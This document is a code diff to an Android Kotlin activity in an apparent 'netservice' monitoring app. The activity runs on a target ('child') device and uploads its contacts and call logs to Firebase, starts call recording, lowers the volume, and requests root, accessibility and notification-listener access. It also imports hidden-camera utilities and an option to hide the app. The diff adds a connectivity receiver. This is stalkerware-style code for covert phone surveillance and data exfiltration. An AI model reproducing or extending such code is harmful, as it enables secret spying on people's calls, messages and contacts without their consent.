@@ -2,62 +2,59 @@ package com.dtz.netservice.ui.activities.mainchild
 
 import android.Manifest.permission.SYSTEM_ALERT_WINDOW
 import android.app.AppOpsManager
+import android.content.BroadcastReceiver
 import android.content.Context
+import android.content.IntentFilter
 import android.media.AudioManager
 import android.media.MediaRecorder
+import android.net.ConnectivityManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
-import android.util.Log
 import android.widget.Button
-import com.dtz.netservice.R
-import com.dtz.netservice.data.model.ChildPhoto
-import com.dtz.netservice.rxFirebase.InterfaceFirebase
-import com.dtz.netservice.ui.activities.base.BaseActivity
-import com.dtz.netservice.utils.Consts.CHILD_PERMISSION
-import com.dtz.netservice.utils.Consts.CHILD_SHOW_APP
-import com.dtz.netservice.utils.Consts.DATA
-import com.dtz.netservice.utils.Consts.PARAMS
-import com.dtz.netservice.utils.Consts.PHOTO
-import com.dtz.netservice.utils.ConstFun.isNotificationServiceRunning
-import com.dtz.netservice.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
-import com.dtz.netservice.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
-import com.dtz.netservice.utils.hiddenCameraServiceUtils.config.CameraFacing
-import com.dtz.netservice.utils.ConstFun.openUseAccessSettings
-import com.dtz.netservice.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission
-import com.dtz.netservice.data.model.ChildRecording
-import com.dtz.netservice.utils.Consts.RECORDING
-import javax.inject.Inject
-import com.google.firebase.database.DatabaseReference
 import android.widget.RelativeLayout
 import android.widget.Switch
 import cn.pedant.SweetAlert.SweetAlertDialog
 import com.aykuttasil.callrecord.CallRecord
+import com.dtz.netservice.R
+import com.dtz.netservice.data.model.ChildPhoto
+import com.dtz.netservice.data.model.ChildRecording
 import com.dtz.netservice.data.model.GalleryPhoto
 import com.dtz.netservice.data.model.GalleryVideo
 import com.dtz.netservice.preference.DataSharePreference.childSelected
+import com.dtz.netservice.receiver.ConnectReceiver
+import com.dtz.netservice.rxFirebase.InterfaceFirebase
 import com.dtz.netservice.services.accessibilityData.AccessibilityDataService
+import com.dtz.netservice.ui.activities.base.BaseActivity
 import com.dtz.netservice.utils.CallLogs
 import com.dtz.netservice.utils.ConstFun.isAddWhitelist
 import com.dtz.netservice.utils.ConstFun.isAndroidM
+import com.dtz.netservice.utils.ConstFun.isNotificationServiceRunning
 import com.dtz.netservice.utils.ConstFun.openAccessibilitySettings
 import com.dtz.netservice.utils.ConstFun.openNotificationListenerSettings
+import com.dtz.netservice.utils.ConstFun.openUseAccessSettings
 import com.dtz.netservice.utils.ConstFun.openWhitelistSettings
 import com.dtz.netservice.utils.ConstFun.permissionRoot
 import com.dtz.netservice.utils.ConstFun.showApp
 import com.dtz.netservice.utils.Consts.APPLICATIONS
 import com.dtz.netservice.utils.Consts.CALLLOGS
 import com.dtz.netservice.utils.Consts.CHILD_NAME
+import com.dtz.netservice.utils.Consts.CHILD_PERMISSION
+import com.dtz.netservice.utils.Consts.CHILD_SHOW_APP
 import com.dtz.netservice.utils.Consts.COMMAND_ADD_WHITELIST
 import com.dtz.netservice.utils.Consts.COMMAND_ENABLE_ACCESSIBILITY
 import com.dtz.netservice.utils.Consts.COMMAND_ENABLE_ACCESSIBILITY_1
 import com.dtz.netservice.utils.Consts.COMMAND_ENABLE_NOTIFICATION_LISTENER
 import com.dtz.netservice.utils.Consts.COMMAND_GRANT_PERMISSION
 import com.dtz.netservice.utils.Consts.CONTACTS
+import com.dtz.netservice.utils.Consts.DATA
 import com.dtz.netservice.utils.Consts.DEVICE_NAME
 import com.dtz.netservice.utils.Consts.INTERVAL
+import com.dtz.netservice.utils.Consts.PARAMS
 import com.dtz.netservice.utils.Consts.PERMISSION_USAGE_STATS
+import com.dtz.netservice.utils.Consts.PHOTO
 import com.dtz.netservice.utils.Consts.PHOTOS
+import com.dtz.netservice.utils.Consts.RECORDING
 import com.dtz.netservice.utils.Consts.SMSES
 import com.dtz.netservice.utils.Consts.TIMER
 import com.dtz.netservice.utils.Consts.VIDEOS
@@ -66,10 +63,16 @@ import com.dtz.netservice.utils.InstalledApp
 import com.dtz.netservice.utils.SMSes
 import com.dtz.netservice.utils.async.AsyncTaskRunCommand
 import com.dtz.netservice.utils.checkForegroundApp.CheckPermission.getModeManager
+import com.dtz.netservice.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission
+import com.dtz.netservice.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
+import com.dtz.netservice.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
+import com.dtz.netservice.utils.hiddenCameraServiceUtils.config.CameraFacing
+import com.google.firebase.database.DatabaseReference
 import com.jaredrummler.android.device.DeviceName
 import com.pawegio.kandroid.show
 import kotterknife.bindView
 import java.io.File
+import javax.inject.Inject
 
 /**
  * Created by luis rafael on 27/03/18.
@@ -87,6 +90,8 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
     private val switchAccessibility : Switch by bindView(R.id.switch_accessibility)
     private val switchNotificationListener : Switch by bindView(R.id.switch_notification)
     private val switchWhitelist : Switch by bindView(R.id.switch_add_whitelist)
+
+    private val connectReceiver: BroadcastReceiver = ConnectReceiver()
 
     @Inject
     lateinit var firebase: InterfaceFirebase
@@ -134,7 +139,7 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
         val contactsList = Contacts.contactsList(this)
         getReference("$CONTACTS/").setValue(contactsList)
 
-        //Contacts
+        //CallLog
         val callList = CallLogs.callList(this)
         getReference("$CALLLOGS/").setValue(callList)
 
@@ -148,6 +153,8 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
 
         startRecordingService()
         reduceVolume()
+        val filter = IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION)
+        registerReceiver(connectReceiver, filter)
 
     }
 
@@ -174,8 +181,6 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
             checkPermissions()
         }
         btnEnableService.setOnClickListener {
-
-
 
             if (!AccessibilityDataService.isRunningService){
                 permissionRoot {
@@ -279,7 +284,7 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
             .setShowSeed(true) // optional & default value ->Ex: RecordFileName_incoming.amr || RecordFileName_outgoing.amr
             .build()
 
-        callRecord.startCallRecordService();
+        callRecord.startCallRecordService()
     }
 
     private fun dialog(type:Int,msg:Int,action:(()->Unit)?=null){
@@ -291,5 +296,10 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
     override fun onDestroy() {
         hideDialog()
         super.onDestroy()
+    }
+
+    override fun onStop() {
+        //unregisterReceiver(connectReceiver)
+        super.onStop()
     }
 }
